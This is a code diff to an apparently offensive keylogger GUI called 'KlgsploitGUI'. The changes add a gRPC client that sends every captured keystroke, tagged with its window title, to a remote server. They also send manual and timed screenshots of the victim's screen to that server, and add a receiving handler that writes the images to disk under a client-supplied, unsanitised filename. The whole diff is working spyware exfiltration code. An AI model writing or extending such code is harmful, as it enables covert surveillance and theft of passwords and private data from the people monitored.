@@ -165,6 +165,10 @@ class KlgsploitGUI:
         self.grpc_server_running = False
         self.update_timer = None
 
+        # gRPC client variables
+        self.grpc_channel = None
+        self.grpc_stub = None
+
         # Control variables
         self.var_status = StringVar(value="Inactive")
         self.var_output_file = StringVar(value="keylog.txt")
@@ -1266,6 +1270,21 @@ class KlgsploitGUI:
         self.start_time = datetime.now()
         self.var_key_count.set("0")
         self.var_window_count.set("0")
+        
+        # Initialize gRPC client if server is configured
+        grpc_server = self.var_grpc_server.get().strip()
+        if grpc_server:
+            try:
+                import grpc
+                import protos.server_pb2 as keylog_pb2
+                import protos.server_pb2_grpc as keylog_pb2_grpc
+                
+                self.grpc_channel = grpc.insecure_channel(grpc_server)
+                self.grpc_stub = keylog_pb2_grpc.KeylogServiceStub(self.grpc_channel)
+                print(f"[+] gRPC client connected to {grpc_server}")
+            except Exception as e:
+                print(f"[-] gRPC client error: {e}")
+                self.grpc_stub = None
 
         def on_press(key):
             if not self.keylogger_running:
@@ -1300,6 +1319,27 @@ class KlgsploitGUI:
                     
                     self.key_count += 1
                     self.var_key_count.set(str(self.key_count))
+                
+                # Send to gRPC server
+                if self.grpc_stub:
+                    try:
+                        import protos.server_pb2 as keylog_pb2
+                        
+                        # Format message
+                        if hasattr(key, 'char') and key.char:
+                            message = f"[{timestamp}] Key: {key.char}"
+                        else:
+                            key_name = str(key).replace('Key.', '')
+                            message = f"[{timestamp}] [{key_name}]"
+                        
+                        if current_window:
+                            message = f"Window: {current_window} | {message}"
+                        
+                        # Send non-blocking
+                        self.grpc_stub.SendKeylog.future(keylog_pb2.KeylogRequest(message=message))
+                    except Exception as e:
+                        print(f"gRPC send error: {e}")
+                        
             except Exception as e:
                 print(f"Error: {e}")
 
@@ -1325,6 +1365,16 @@ class KlgsploitGUI:
         if self.keylogger_listener:
             self.keylogger_listener.stop()
             self.keylogger_listener = None
+        
+        # Close gRPC channel
+        if self.grpc_channel:
+            try:
+                self.grpc_channel.close()
+                print("[+] gRPC client disconnected")
+            except:
+                pass
+            self.grpc_channel = None
+            self.grpc_stub = None
         
         self._stop_stats_update()
 
@@ -1354,21 +1404,50 @@ class KlgsploitGUI:
         filepath = os.path.join(folder, f"screenshot_{timestamp}.png")
 
         try:
+            # Take screenshot
+            screenshot_data = None
             if HAS_PIL:
                 screenshot = ImageGrab.grab()
                 screenshot.save(filepath)
-                self._show_info("Success", f"Screenshot saved: {filepath}")
-                # Update counter
-                count = int(self.var_screenshot_count.get())
-                self.var_screenshot_count.set(str(count + 1))
+                # Convert to bytes for gRPC
+                import io
+                buffer = io.BytesIO()
+                screenshot.save(buffer, format='PNG')
+                screenshot_data = buffer.getvalue()
+                
             elif HAS_MSS:
                 with mss.mss() as sct:
                     sct.shot(output=filepath)
-                self._show_info("Success", f"Screenshot saved: {filepath}")
-                count = int(self.var_screenshot_count.get())
-                self.var_screenshot_count.set(str(count + 1))
+                # Read the saved file to send via gRPC
+                with open(filepath, 'rb') as f:
+                    screenshot_data = f.read()
             else:
                 self._show_error("Error", "No screenshot library available. Install PIL or mss.")
+                return
+            
+            # Update counter
+            count = int(self.var_screenshot_count.get())
+            self.var_screenshot_count.set(str(count + 1))
+            
+            # Send to gRPC server if connected
+            if self.grpc_stub and screenshot_data:
+                try:
+                    import protos.server_pb2 as keylog_pb2
+                    filename = f"screenshot_{timestamp}.png"
+                    
+                    # Send screenshot non-blocking
+                    future = self.grpc_stub.SendScreenshot.future(
+                        keylog_pb2.ScreenshotRequest(
+                            filename=filename,
+                            image_data=screenshot_data
+                        )
+                    )
+                    print(f"📸 Screenshot sent to server: {filename}")
+                except Exception as e:
+                    print(f"Failed to send screenshot to gRPC: {e}")
+            
+            self._show_info("Success", f"Screenshot saved: {filepath}")
+            
         except Exception as e:
             self._show_error("Error", f"Failed to take screenshot: {str(e)}")
 
@@ -1407,16 +1486,40 @@ class KlgsploitGUI:
                     if should_capture:
                         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                         filepath = os.path.join(folder, f"auto_{timestamp}.png")
+                        screenshot_data = None
 
                         if HAS_PIL:
                             screenshot = ImageGrab.grab()
                             screenshot.save(filepath)
+                            # Convert to bytes
+                            import io
+                            buffer = io.BytesIO()
+                            screenshot.save(buffer, format='PNG')
+                            screenshot_data = buffer.getvalue()
+                            
                         elif HAS_MSS:
                             with mss.mss() as sct:
                                 sct.shot(output=filepath)
+                            with open(filepath, 'rb') as f:
+                                screenshot_data = f.read()
                         
                         count = int(self.var_screenshot_count.get())
                         self.var_screenshot_count.set(str(count + 1))
+                        
+                        # Send to gRPC if connected
+                        if self.grpc_stub and screenshot_data:
+                            try:
+                                import protos.server_pb2 as keylog_pb2
+                                filename = f"auto_{timestamp}.png"
+                                self.grpc_stub.SendScreenshot.future(
+                                    keylog_pb2.ScreenshotRequest(
+                                        filename=filename,
+                                        image_data=screenshot_data
+                                    )
+                                )
+                                print(f"📸 Auto screenshot sent: {filename}")
+                            except:
+                                pass
 
                     if not self.var_screenshot_on_change.get():
                         time.sleep(self.var_screenshot_interval.get())
@@ -1836,10 +1939,40 @@ listener.join()
             gui = self
 
             class KeylogServer(keylog_pb2_grpc.KeylogServiceServicer):
+                def __init__(self):
+                    # Create screenshots directory
+                    self.screenshot_dir = "received_screenshots"
+                    if not os.path.exists(self.screenshot_dir):
+                        os.makedirs(self.screenshot_dir)
+                
                 def SendKeylog(self, request, context):
                     gui.app.after(0, lambda: gui.txt_grpc_log.insert(END, f"[RECV] {request.message}\n"))
                     gui.app.after(0, lambda: gui.txt_grpc_log.see(END))
                     return keylog_pb2.KeylogResponse(response=True)
+                
+                def SendScreenshot(self, request, context):
+                    try:
+                        # Save screenshot
+                        filepath = os.path.join(self.screenshot_dir, request.filename)
+                        with open(filepath, 'wb') as f:
+                            f.write(request.image_data)
+                        
+                        # Display in GUI
+                        msg = f"[SCREENSHOT] Received and saved: {filepath}\n"
+                        gui.app.after(0, lambda: gui.txt_grpc_log.insert(END, msg))
+                        gui.app.after(0, lambda: gui.txt_grpc_log.see(END))
+                        
+                        return keylog_pb2.ScreenshotResponse(
+                            success=True,
+                            message=f"Screenshot saved: {filepath}"
+                        )
+                    except Exception as e:
+                        error_msg = f"[ERROR] Failed to save screenshot: {e}\n"
+                        gui.app.after(0, lambda: gui.txt_grpc_log.insert(END, error_msg))
+                        return keylog_pb2.ScreenshotResponse(
+                            success=False,
+                            message=f"Error: {str(e)}"
+                        )
 
             def run_server():
                 server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
